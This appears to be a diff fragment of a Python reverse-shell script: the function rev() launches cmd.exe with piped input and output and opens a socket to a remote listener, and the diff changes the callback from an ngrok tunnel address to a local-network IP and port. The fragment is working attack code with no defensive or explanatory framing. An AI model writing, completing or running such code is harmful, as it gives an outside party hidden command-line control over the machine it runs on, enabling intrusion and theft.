@@ -7,7 +7,7 @@ import time
 def rev():
    p = sp.Popen(['cmd.exe'], stdin=sp.PIPE, stdout=sp.PIPE, stderr=sp.STDOUT)
    s = socket.socket()
-   s.connect(('0.tcp.eu.ngrok.io', 14729))
+   s.connect(('192.168.1.16',2222))
 
    def s_o():
        while True:
